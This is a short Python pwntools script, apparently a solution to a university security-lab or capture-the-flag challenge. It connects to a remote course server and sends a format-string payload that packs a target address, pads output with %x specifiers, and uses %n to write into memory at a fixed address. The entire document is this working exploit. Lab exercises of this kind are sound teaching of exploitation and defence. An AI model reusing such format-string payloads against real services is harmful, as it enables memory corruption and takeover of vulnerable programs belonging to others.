from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22193

## run a remote process
s = remote(SERVER, PORT, timeout=9999)

address = p32(0x0804a040)
s.sendline(address+b'%08x'*5+b'%024x'+b'%n ')
result = s.recvall()
print(result)
